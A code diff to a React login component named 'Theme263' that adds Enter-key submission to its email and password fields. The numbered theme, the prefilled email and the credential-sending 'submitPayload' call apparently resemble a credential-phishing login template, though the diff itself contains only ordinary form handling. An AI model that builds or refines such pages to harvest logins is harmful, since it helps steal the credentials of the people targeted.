@@ -14,7 +14,7 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
@@ -24,6 +24,12 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -125,6 +131,7 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
                   setEmail(e.target.value);
                   if (error) setError(null);
                 }}
+                onKeyDown={handleKeyDown}
                 className="w-full pl-10 pr-4 py-2 text-[13px] border border-gray-200 rounded focus:outline-none focus:border-blue-400"
               />
             </div>
@@ -143,6 +150,7 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
                   setPassword(e.target.value);
                   if (error) setError(null);
                 }}
+                onKeyDown={handleKeyDown}
                 className="w-full pl-10 pr-4 py-2 text-[13px] border border-gray-200 rounded focus:outline-none focus:border-blue-400"
               />
             </div>
